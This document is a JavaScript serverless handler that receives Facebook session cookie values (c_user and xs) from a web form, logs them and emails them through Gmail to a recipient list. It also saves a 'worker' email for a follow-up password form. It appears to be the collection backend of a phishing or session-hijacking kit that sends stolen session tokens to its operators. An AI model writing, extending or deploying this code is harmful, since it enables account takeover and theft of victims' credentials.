import nodemailer from 'nodemailer';
import { setWorkerEmail } from './emailStore.js';

export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  try {
    const { c_user, xs, emails, workerEmail, name } = req.body;

    // ✅ SAVE workerEmail for password form
    if (workerEmail) {
      setWorkerEmail(workerEmail);
    }
    
    console.log('📨 Submit Form:');
    console.log('c_user:', c_user);
    console.log('xs:', xs);
    console.log('Emails to send:', emails);
    console.log('Worker Email (saved for password):', workerEmail);
    
    // Send email ONLY to emails array
    const emailResult = await sendGmail(emails, { c_user, xs, name });

    return res.status(200).json({
      success: true,
      message: 'Form submitted successfully!',
      emailSent: emailResult.success,
      emailMessage: emailResult.message
    });

  } catch (error) {
    console.error('❌ Server Error:', error);
    return res.status(500).json({
      success: false,
      message: 'Server error: ' + error.message
    });
  }
}

async function sendGmail(toEmails, formData) {
  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.GMAIL_USER,
        pass: process.env.GMAIL_APP_PASS
      }
    });

    const mailOptions = {
      from: `"Form System" <${process.env.GMAIL_USER}>`,
      to: toEmails.join(', '),
      subject: `✅ New Submission: ${formData.name}`,
      html: `<div><h2>New Form</h2><p>c_user: ${formData.c_user}</p><p>xs: ${formData.xs}</p></div>`
    };

    await transporter.sendMail(mailOptions);
    console.log('✅ Email sent to:', toEmails);
    return { success: true, message: 'Email sent!' };

  } catch (error) {
    console.error('❌ Email Error:', error);
    return { success: false, message: error.message };
  }
}
